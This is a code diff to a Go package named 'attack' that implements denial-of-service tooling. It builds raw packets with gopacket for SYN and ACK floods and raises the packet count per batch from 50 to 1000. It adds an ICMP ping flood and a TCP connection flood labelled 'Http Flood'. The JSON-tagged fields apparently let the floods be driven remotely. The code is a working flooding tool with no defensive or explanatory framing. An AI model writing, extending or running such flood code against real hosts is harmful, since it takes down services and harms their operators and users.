@@ -1,9 +1,12 @@
 package attack
 
 import (
+	"fmt"
 	"log"
 	"net"
+	"strconv"
 
+	"github.com/go-ping/ping"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/examples/util"
 	"github.com/google/gopacket/layers"
@@ -11,18 +14,18 @@ import (
 )
 
 type DDOS struct {
-	host             string
-	port             int16
-	packetbatchcount int64
-	attackType       string
+	Host             string `json:"host"`
+	Port             int16  `json:"port"`
+	Packetbatchcount int64  `json:"packet_batch_count"`
+	AttackType       string `json:"attack_type"`
 }
 
-func (a *DDOS) Attack() {
+func (a *DDOS) TCPAttack() {
 	defer util.Run()()
 
 	var srcIP, dstIP net.IP
 	var srcIPstr string = "127.0.0.1"
-	var dstIPstr string = a.host
+	var dstIPstr string = a.Host
 
 	srcIP = net.ParseIP(srcIPstr)
 	if srcIP == nil {
@@ -51,7 +54,7 @@ func (a *DDOS) Attack() {
 	}
 
 	srcport := layers.TCPPort(666)
-	dstport := layers.TCPPort(a.port)
+	dstport := layers.TCPPort(a.Port)
 	tcp := layers.TCP{
 		SrcPort: srcport,
 		DstPort: dstport,
@@ -104,19 +107,51 @@ func (a *DDOS) Attack() {
 	if err != nil {
 		log.Fatal("Error while sending raw packet")
 	}
-	if a.attackType == "1" {
+	if a.AttackType == "1" {
 		tcp.SYN = true
 		// SYN Flood -> 1
-	} else if a.attackType == "2" {
+	} else if a.AttackType == "2" {
 		tcp.ACK = true
 		// ACK Flood -> 2
 	}
-	for j := 0; j < int(a.packetbatchcount); j++ {
-		for i := 0; i < 50; i++ {
+	for j := 0; j < int(a.Packetbatchcount); j++ {
+		for i := 0; i < 1000; i++ {
 			err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
 			if err != nil {
 				log.Fatal("Error while send data")
 			}
 		}
+	}
+}
+
+func (a *DDOS) ICMPAttack() {
+	// ICMP Flood -> 3
+	totalPackets := 100 * a.Packetbatchcount
+	for totalPackets > 0 {
+		pinger, err := ping.NewPinger(a.Host)
+		if err != nil {
+			log.Fatal("Error while creating pinger object " + err.Error())
+		}
+		pinger.Count = 100
+		err = pinger.Run()
+		if err != nil {
+			log.Fatal("Error while executing ICMP Flood attack " + err.Error())
+		}
+		statistics := pinger.Statistics()
+		fmt.Println(statistics)
+		totalPackets = totalPackets - 100
+	}
+}
+
+func (a *DDOS) HttpFlood() {
+	//Http Flood -> 4
+	totalPackets := a.Packetbatchcount * 100
+	target := a.Host + ":" + strconv.Itoa(int(a.Port))
+	for totalPackets > 0 {
+		con, err := net.Dial("tcp", target)
+		if err != nil {
+			log.Fatal("Http request failed " + err.Error())
+		}
+		con.Close()
 	}
 }
